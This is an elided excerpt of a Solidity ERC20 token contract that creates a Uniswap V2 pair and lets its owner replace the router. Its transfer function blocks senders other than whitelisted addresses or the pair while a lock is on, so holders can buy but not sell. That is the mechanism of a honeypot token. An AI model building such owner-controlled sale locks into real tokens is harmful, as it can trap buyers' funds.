...
contract TestToken is ERC20, Ownable {
    ...
    constructor(address uniV2Router) ERC20("TestToken", "TT") {
        require(uniV2Router != address(0), "ROUTER CANNOT BE ZERO");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniV2Router);

        address _uniswapV2Pair = IUniswapFactory(_uniswapV2Router.factory()).createPair(
            address(this),
    ...
    function updateuniswapV2Router(address newAddress) public onlyOwner {
        ...
        address _uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(
            address(this),
    ...
    function _transfer(
        ...
        require(
            !tokenLock || whiteList[from] || (from == uniswapV2Pair),
            "ERC20: lock now"
        );
